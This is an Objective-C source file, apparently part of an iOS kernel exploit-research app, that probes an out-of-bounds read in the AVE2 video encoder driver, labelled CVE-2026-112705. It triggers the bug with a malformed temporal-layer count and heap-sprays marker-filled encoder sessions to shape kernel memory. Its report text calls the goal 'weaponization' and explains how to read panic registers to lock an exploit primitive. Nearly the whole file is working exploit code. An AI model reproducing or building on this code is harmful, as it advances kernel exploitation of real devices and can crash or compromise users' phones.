#import "KPAuditAVESpriteModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>

@interface KPAuditAVESpriteModule ()
@property (nonatomic, assign) int sprayCount;
@property (nonatomic, assign) uint32_t marker;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditAVESpriteModule

- (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker {
    self = [super init];
    if (self) {
        _sprayCount = count;
        _marker = marker;
        _identifier = [NSString stringWithFormat:@"ave112705.sprite%d.armed", count];
        _title = [NSString stringWithFormat:@"AVE2 sprite x%d", count];
        _subtitle = @"CVE-2026-112705: spray sessions, then victim NTL=16463 — far register is the oracle";
        _icon = @"square.grid.3x3.middle.filled";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-ave-sprite-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ave-sprite] %@", line];
}

- (VTCompressionSessionRef)makeSessionWidth:(int)w height:(int)h {
    VTCompressionSessionRef session = NULL;
    OSStatus s = VTCompressionSessionCreate(kCFAllocatorDefault, w, h,
                                            kCMVideoCodecType_HEVC,
                                            NULL, NULL, NULL,
                                            NULL, NULL, &session);
    return (s == noErr) ? session : NULL;
}

- (CVPixelBufferRef)makeBufferWidth:(int)w height:(int)h {
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        NULL, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)h);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)h / 2));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112705 · AVE2 sprite probe ===\n"];
    [report appendString:@"Weaponization question: does the OOB read consume SHAPED memory?\n"];
    [report appendString:@"Oracle: after the victim's panic, far/x0 shows what was read.\n"];
    [report appendString:@"  far=0x59               -> spray missed (baseline signature)\n"];
    [report appendString:@"  far low dword = 0x59 with high dword = marker bits -> partial hit\n"];
    [report appendString:@"  far contains marker 0x{marker} -> neighbour is OURS, pointer ours.\n"];
    [report appendString:@"Order: victim session FIRST, spray AFTER (OOB reads forward),\n"];
    [report appendString:@"       then encode the victim (NTL=16463 => may reboot the device).\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
    [report appendFormat:@"marker=0x%08x spray=%d\n", self.marker, self.sprayCount];

    const int32_t W = 1280, H = 720;
    const int32_t sw = 64, sh = 64;

    // 1) VICTIM session first — its pInfo is allocated BEFORE the spray,
    //    so spray siblings land after it in the zone (forward OOB reads them).
    VTCompressionSessionRef victim = [self makeSessionWidth:W height:H];
    if (!victim) {
        [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
        return report;
    }
    int ntl = 16463;
    VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
    int usage = 1;
    VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(usage));
    [self journal:[NSString stringWithFormat:@"VICTIM_READY ntl=%d", ntl]];

    // 2) SPRAY siblings — same driver, same pInfo allocation class.
    //    Each sibling carries the marker in several int-valued properties so
    //    whichever field the OOB u64 picks up, it looks like ours.
    int32_t marker = (int32_t)self.marker;
    NSMutableArray *siblings = [NSMutableArray array];
    for (int i = 0; i < self.sprayCount; i++) {
        VTCompressionSessionRef s = [self makeSessionWidth:sw height:sh];
        if (!s) continue;
        // two adjacent ints of the same marker build the u64 marker||marker
        VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("ExpectedFrameRate"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(marker));
        [siblings addObject:[NSValue valueWithPointer:s]];
    }
    [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d marker=0x%08x", (int)siblings.count, self.marker]];

    // 3) VICTIM encode — the OOB read fires here. May panic the kernel.
    CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
    [self journal:[NSString stringWithFormat:@"BEFORE_VICTIM_ENCODE ntl=%d (panic expected; far shows the consumed bytes)", ntl]];
    if (pb) {
        VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        VTCompressionSessionCompleteFrames(victim, kCMTimeInvalid);
    }
    [self journal:@"AFTER_VICTIM_ENCODE survived — no panic this time"];

    for (NSValue *v in siblings) {
        VTCompressionSessionInvalidate((VTCompressionSessionRef)v.pointerValue);
        CFRelease((VTCompressionSessionRef)v.pointerValue);
    }
    if (pb) CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(victim);
    CFRelease(victim);

    [report appendFormat:@"\nsessions_created=%d\n", (int)siblings.count];
    [report appendString:@"\nVERDICT: "];
    [report appendString:@"SEE_JOURNAL_AND_PANIC_FAR\n"];
    [report appendString:
     @"If the device panicked: pull panic-full and read far/x0.\n"
     @"  far=0x59 -> spray did not shape the OOB read; try a different object\n"
     @"             class (kalloc size matching the pInfo zone) or more volume.\n"
     @"  far != 0x59 -> OUR data was consumed. Compare against the marker to\n"
     @"             locate the exact field and lock the primitive.\n"];
    return report;
}

@end
